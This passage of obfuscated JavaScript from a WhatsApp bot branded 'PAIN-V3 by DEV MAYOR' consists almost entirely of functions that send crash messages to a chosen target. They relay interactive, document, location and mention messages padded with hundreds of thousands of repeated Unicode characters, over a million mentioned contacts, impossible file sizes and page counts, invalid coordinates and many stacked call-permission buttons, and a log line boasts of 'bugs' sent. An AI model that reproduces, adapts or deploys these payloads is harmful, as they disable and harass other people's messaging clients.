            buttonParamsJson: "{ display_text : '𝐏𝐀𝐈𝐍-𝐕𝟑', url : '', merchant_url : '' }"
          }]
        }
      };
      const v118 = {
        interactiveMessage: v117
      };
      const v119 = {
        message: v118
      };
      const v120 = {
        viewOnceMessage: v119
      };
      await mayor.relayMessage(p59, v120, {
        participant: {
          jid: p59
        }
      }, {
        messageId: null
      });
    }
    async function f14(p60) {
      let v122 = "𝐏𝐀𝐈𝐍-𝐕𝟑 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑" + "𑜦".repeat(40000);
      const v123 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
        fileLength: "999999999",
        pageCount: 9999999999999,
        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
        fileName: v122,
        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1715880173",
        contactVcard: true
      };
      const v124 = {
        documentMessage: v123,
        title: v122,
        hasMediaAttachment: true
      };
      await mayor.relayMessage(p60, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: v124,
              body: {
                text: ""
              },
              nativeFlowMessage: {
                buttons: Array(20).fill({
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                })
              }
            }
          }
        }
      }, {
        participant: {
          jid: p60
        }
      }, {
        messageId: null
      });
    }
    async function f15(p61) {
      let v127 = "𝐏𝐀𝐈𝐍-𝐕𝟑  𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑";
      let v129 = Array.from({
        length: 200
      }, () => ({
        name: "call_permission_request",
        buttonParamsJson: "{}"
      }));
      let v131 = Array.from({
        length: 1039900
      }, () => p61);
      const v132 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
        fileLength: "999999999",
        pageCount: 9999999999999,
        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
        fileName: v127,
        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1715880173",
        contactVcard: true
      };
      const v133 = {
        documentMessage: v132,
        title: v127,
        hasMediaAttachment: true
      };
      const v134 = {
        text: v127
      };
      const v135 = {
        buttons: v129
      };
      const v136 = {
        header: v133,
        body: v134,
        nativeFlowMessage: v135
      };
      const v137 = {
        interactiveMessage: v136
      };
      const v138 = {
        message: v137
      };
      const v140 = {
        mentionedJid: v131,
        externalAdReply: {
          showAdAttribution: true,
          renderLargerThumbnail: false,
          title: "𝐏𝐀𝐈𝐍-𝐕𝟑 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ",
          body: "𝐏𝐀𝐈𝐍 - 𝐕𝟑 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐅 ",
          previewType: "VIDEO",
          thumbnail: "",
          sourceUrl: "https://www.whatsapp.com/",
          mediaUrl: "https://www.whatsapp.com/"
        }
      };
      const v141 = {
        viewOnceMessage: v138,
        contextInfo: v140
      };
      await mayor.relayMessage(p61, v141, {
        participant: {
          jid: p61
        }
      }, {
        messageId: null
      });
    }
    async function f16(p62) {
      let v143 = "𝐏𝐀𝐈𝐍-𝐕𝟑 𝐁𝐘 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ";
      const v144 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
        fileLength: "999999999",
        pageCount: 9999999999999,
        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
        fileName: v143,
        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1715880173",
        contactVcard: true
      };
      const v145 = {
        documentMessage: v144,
        hasMediaAttachment: true
      };
      const v146 = {
        text: v143
      };
      await mayor.relayMessage(p62, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: v145,
              body: v146,
              nativeFlowMessage: {
                buttons: [{
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_method",
                  buttonParamsJson: "{}"
                }, {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"☠️𝐏𝐀𝐈𝐍☠️   ◄" + "᬴".repeat(60000) + "\",\"sections\":[{\"title\":\"👑 𝐏𝐀𝐈𝐍-𝐕𝟑 𝐁𝐘 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 \",\"rows\":[]}]}"
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"𝐏𝐀𝐈𝐍-𝐕𝟑 𝐁𝐘 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 \",\"flow_message_version\":\"9\",\"flow_token\":\"𝐏𝐀𝐈𝐍-𝐕𝟑 𝐁𝐘 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 \"}"
                }, {
                  name: "mpm",
                  buttonParamsJson: "{}"
                }],
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\"𝐏𝐀𝐈𝐍-𝐕𝟑 𝐁𝐘 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 \",\"body\":\"Zcoder Crash\"}"
              }
            }
          }
        }
      }, {
        participant: {
          jid: p62
        }
      }, {
        messageId: null
      });
    }
    async function f17(p63) {
      let v151 = "𝐏𝐀𝐈𝐍-𝐕𝟑 𝐁𝐘 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 " + "ꦾ".repeat(50000);
      let v153 = Array.from({
        length: 35000
      }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");
      const v154 = {
        title: " @120363326274964194@g.us",
        listType: "SINGLE_SELECT",
        singleSelectvF6: {},
        description: " @120363326274964194@g.us",
        contextInfo: {}
      };
      v154.singleSelectvF6.selectedRowId = "𝗣𝗔𝗜𝗡-𝗩𝟯";
      v154.contextInfo.mentionedJid = v153;
      v154.contextInfo.groupMentions = [{
        groupJid: "120363326274964194@g.us",
        groupSubject: v151
      }];
      const v155 = {
        listResponseMessage: v154
      };
      const v156 = {
        message: v155
      };
      const v157 = {
        groupMentionedMessage: v156
      };
      let vV157 = v157;
      await mayor.relayMessage(p63, vV157, {
        participant: {
          jid: p63
        }
      }, {
        messageId: null
      });
    }
    async function f18(p64) {
      await mayor.relayMessage(p64, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0
                },
                hasMediaAttachment: true
              },
              body: {
                text: "𝐏𝐀𝐈𝐍-𝐕𝟑" + "ꦾ".repeat(300000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "𝐏𝐀𝐈𝐍-𝐕𝟑"
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: p64
        }
      }, {
        messageId: null
      });
    }
    async function f19(p65, p66, p67 = false) {
      let vGenerateWAMessageFromContent12 = generateWAMessageFromContent(p65, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "𝐏𝐀𝐈𝐍-𝐕𝟑 𝐕𝐈𝐏",
                locationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 922.999999999999,
                  name: "👑𝐏𝐀𝐈𝐍-𝐕𝟑 𝐁𝐘 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ",
                  address: "👑𝐏𝐀𝐈𝐍-𝐕𝟑 𝐁𝐘 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ",
                  jpegThumbnail: fs.readFileSync("./image/xcrash.png")
                },
                hasMediaAttachment: true
              },
              body: {
                text: ""
              },
              nativeFlowMessage: {
                messageParamsJson: "👑 𝐏𝐀𝐈𝐍-𝐕𝟑 𝐕𝐈𝐏 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ",
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: {
                    title: "👑𝐏𝐀𝐈𝐍-𝐕𝟑 𝐕𝐈𝐏 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ",
                    sections: [{
                      title: "👑𝐏𝐀𝐈𝐍-𝐕𝟑 𝐕𝐈𝐏 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ",
                      rows: []
                    }]
                  }
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: {}
                }]
              }
            }
          }
        }
      }), {
        userJid: p65,
        quoted: v93
      });
      await mayor.relayMessage(p65, vGenerateWAMessageFromContent12.message, p67 ? {
        participant: {
          jid: p65
        }
      } : {});
    }
    ;
    async function f20(p68, p69, p70, p71 = false) {
      let vGenerateWAMessageFromContent13 = generateWAMessageFromContent(p68, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "𝐏𝐀𝐈𝐍-𝐕𝟑 𝐕𝐈𝐏" + "ꦾ".repeat(77777),
                locationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 922.999999999999,
                  name: "👑𝐏𝐀𝐈𝐍-𝐕𝟑 𝐕𝐈𝐏 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ",
                  address: "👑𝐏𝐀𝐈𝐍-𝐕𝟑 𝐕𝐈𝐏 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ",
                  jpegThumbnail: fs.readFileSync("./image/xcrash.png")
                },
                hasMediaAttachment: true
              },
              body: {
                text: ""
              },
              nativeFlowMessage: {
                messageParamsJson: "👑𝐏𝐀𝐈𝐍-𝐕𝟑 𝐕𝐈𝐏 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ",
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: {
                    title: "👑𝐏𝐀𝐈𝐍-𝐕𝟑 𝐕𝐈𝐏 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ",
                    sections: [{
                      title: "👑𝐏𝐀𝐈𝐍-𝐕𝟑 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ",
                      rows: []
                    }]
                  }
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: {}
                }]
              }
            }
          }
        }
      }), {
        userJid: p68,
        quoted: v93
      });
      await mayor.relayMessage(p68, vGenerateWAMessageFromContent13.message, p71 ? {
        participant: {
          jid: p68
        }
      } : {});
    }
    ;
    async function f21(p72, p73, p74 = false, p75 = false) {
      const v168 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
        fileLength: "9999999999999",
        pageCount: 9007199254740991,
        mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
        fileName: "👑𝐏𝐀𝐈𝐍-𝐕𝟑 𝐁𝐘 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ",
        fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1723855952",
        contactVcard: true,
        thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
        thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
        thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
        jpegThumbnail: v50
      };
      const v169 = {
        title: "",
        documentMessage: v168,
        hasMediaAttachment: true
      };
      let vGenerateWAMessageFromContent14 = generateWAMessageFromContent(p72, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: v169,
              body: {
                text: "𝐏𝐀𝐈𝐍-𝐕𝟑"
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 👑 trashdex - explanation \",\"body\":\"xxx\"}",
                buttons: [p74 ? {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"👺༑⌁⃰👑𝐏𝐀𝐈𝐍-𝐕𝟑 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 〽️" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐏𝐀𝐈𝐍-𝐕𝟑\",\"rows\":[]}]}"
                } : {
                  name: "payment_method",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_method",
                  buttonParamsJson: "{}"
                }, {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"👺༑⌁⃰👑𝐏𝐀𝐈𝐍-𝐕𝟑 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 〽️\",\"sections\":[{\"title\":\"𝗣𝗔𝗜𝗡-𝗩𝟯\",\"rows\":[]}]}"
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                }, {
                  name: "mpm",
                  buttonParamsJson: "{}"
                }]
              }
            }
          }
        }
      }), {
        userJid: p72,
        quoted: v93
      });
      await mayor.relayMessage(p72, vGenerateWAMessageFromContent14.message, p75 ? {
        participant: {
          jid: p72
        }
      } : {});
      console.log(chalk.green("𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 𝗦𝗘𝗡𝗧 𝗕𝗨𝗚𝗦 ☠️𝗧𝗛𝗔𝗡𝗞𝗦 𝗙𝗢𝗥 𝗨𝗦𝗜𝗡𝗚 𝗣𝗔𝗜𝗡-𝗩𝟯 ©𝗗𝗘𝗩 𝗠𝗔𝗬𝗢𝗥👑..."));
    }
    async function f22(p76, p77, p78 = false) {
      let vGenerateWAMessageFromContent15 = generateWAMessageFromContent(p76, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "𝐏𝐀𝐈𝐍-𝐕𝟑",
                locationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 922.999999999999,
                  name: "👑𝐏𝐀𝐈𝐍-𝐕𝟑 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ",
                  address: "👑𝐏𝐀𝐈𝐍-𝐕𝟑 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ",
                  jpegThumbnail: fs.readFileSync("./image/xcrash.png")
                },
                hasMediaAttachment: true
              },
              body: {
                text: ""
              },
              nativeFlowMessage: {
                messageParamsJson: "👑𝐏𝐀𝐈𝐍-𝐕𝟑 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ",
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: {
                    title: "👑𝐏𝐀𝐈𝐍-𝐕𝟑 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ",
                    sections: [{
                      title: "👑𝐏𝐀𝐈𝐍-𝐕𝟑 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ",
                      rows: []
                    }]
                  }
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: {}
                }]
              }
            }
          }
        }
      }), {
        userJid: p76,
        quoted: v93
      });
      await mayor.relayMessage(p76, vGenerateWAMessageFromContent15.message, p78 ? {
        participant: {
          jid: p76
        }
      } : {});
    }
    ;
    async function f23(p79, p80 = false) {
      await mayor.relayMessage(p79, {
        extendedTextMessage: {
          text: "𝐏𝐀𝐈𝐍-𝐕𝟑\n" + "@6289999999999".repeat(150000),
          contextInfo: {
            mentionedJid: ["6289999999999@s.whatsapp.net", ...Array.from({
              length: 15000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            stanzaId: "1234567890ABCDEF",
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              callLogMesssage: {
                isVideo: true,
                callOutcome: "1",
                durationSecs: "0",
                callType: "REGULAR",
                participants: [{
                  jid: "0@s.whatsapp.net",
                  callOutcome: "1"
                }]
              }
            },
            remoteJid: p79,
            conversionSource: " X ",
            conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAmayorBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vmayorkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
            conversionDelaySeconds: 10,
            forwardingScore: 9999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " X ",
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAmayorBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vmayorkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              caption: " X "
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            },
            expiration: 86400,
            ephemeralSettingTimestamp: "1728090592378",
            ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
            externalAdReply: {
              title: "𝐏𝐀𝐈𝐍-𝐕𝟑",
              body: "𝐏𝐀𝐈𝐍-𝐕𝟑",
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewType: "VIDEO",
              thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
              sourceType: " x ",
              sourceId: " x ",
              sourceUrl: "https://call.whatsapp.com/video/5fkKnwookMmakllas",
              mediaUrl: "https://call.whatsapp.com/video/5fkKnwookMmakllas",
              containsAutovF6: true,
              showAdAttribution: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example"
            },
            entryPointConversionSource: "entry_point_source_example",
            entryPointConversionApp: "entry_point_app_example",
            entryPointConversionDelaySeconds: 5,
            disappearingMode: {},
            actionchannel: {
              url: "https://call.whatsapp.com/video/5fkKnwookMmakllas"
            },
            groupSubject: " X ",
            parentGroupJid: "6287888888888-1234567890@g.us",
            trustBannerType: " X ",
            trustBannerAction: 1,
            ismayorpled: false,
            utm: {
              utmSource: " X ",
              utmCampaign: " X "
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "6287888888888-1234567890@g.us",
              serverMessageId: 1,
              newsletterName: " X ",
              contentType: "UPDATE",
              accessibilityText: " X "
            },
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net"
            },
            smbClientCampaignId: "smb_client_campaign_id_example",
            smbServerCampaignId: "smb_server_campaign_id_example",
            dataSharingContext: {
              showMmDisclosure: true
            }
          }
        }
      }, p80 ? {
        participant: {
          jid: p79
        }
      } : {});
    }
    ;
    async function f24(p81) {
      let v178 = "𝐏𝐀𝐈𝐍-𝐕𝟑 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ";
      await mayor.relayMessage(p81, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0
                },
                hasMediaAttachment: true
              },
              body: {
                text: "𝐏𝐀𝐈𝐍-𝐕𝟑 𝐁𝐘 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 " + "@zcoder9".repeat(300000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "𝐏𝐀𝐈𝐍-𝐕𝟑 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑  "
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: p81
        }
      }, {
        messageId: null
      });
    }
    let v183 = [];
    for (let v184 of v43) {
      v183.push({
        displayName: await mayor.getName(v184 + "@s.whatsapp.net"),
        vcard: "BEGIN:VCARD\n\nVERSION:3.0\n\nN:" + (await mayor.getName(v184 + "@s.whatsapp.net")) + "\n\nFN:" + (await mayor.getName(v184 + "@s.whatsapp.net")) + "\n\nitem1.TEL;waid=" + v184 + ":" + v184 + "\n\nitem1.X-ABLabel:Ponsel\n\nitem2.EMAIL;type=INTERNET: dikaid.tech@gmail.com\n\nitem2.X-ABLabel:Email\n\nitem3.URL:https://whatsapp.com/channel/0029VaegLveBKfhz5g2mlg1d\nitem3.X-ABLabel:YouTube\n\nitem4.ADR:;;Indonesia;;;;\n\nitem4.X-ABLabel:Region\n\nEND:VCARD"
      });
    }
    function f25(p82) {
      return "```" + p82 + "```";
    }
    function f26(p83) {
      var v185 = "";
      var v186 = p83.toString().split("").reverse().join("");
      for (var v187 = 0; v187 < v186.length; v187++) {
        if (v187 % 3 == 0) {
          v185 += v186.substr(v187, 3) + ".";
        }
      }
      return "" + v185.split("", v185.length - 1).reverse().join("");
    }
    try {
      ppuser = await mayor.profilePictureUrl(m.sender, "image");
    } catch (_0xc6380f) {
      ppuser = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
    }
    if (!mayor.public) {
      if (!m.key.fromMe) {
        return;
      }
    }
    function f27(p84) {
      return p84[Math.floor(Math.random() * p84.length)];
    }
    const v188 = await reSize(ppuser, 300, 300);
    const vF5 = async (p85, p86, p87, p88, p89, p90, p91, p92, p93) => {
      const vGenerateWAMessageFromContent16 = generateWAMessageFromContent(p85, proto.Message.fromObject({
        orderMessage: {
          orderId: p87,
          thumbnail: p88,
          itemCount: p89,
          status: "INQUIRY",
          surface: "CATALOG",
          orderTitle: p90,
          message: p86,
          sellerJid: p91,
          token: p92,
          totalAmount1000: p93,
          totalCurrencyCode: "IDR"
        }
      }), {
        userJid: p85,
        quoted: m
      });
      mayor.relayMessage(p85, vGenerateWAMessageFromContent16.message, {
        messageId: vGenerateWAMessageFromContent16.key.id
      });
    };
    const vF6 = p94 => {
      mayor.sendMessage(m.chat, {
        text: p94,
        contextInfo: {
          mentionedJid: [v26],
          forwardingScore: 9999999,
          isForwarded: true,
          externalAdReply: {
            showAdAttribution: true,
            containsAutovF6: true,
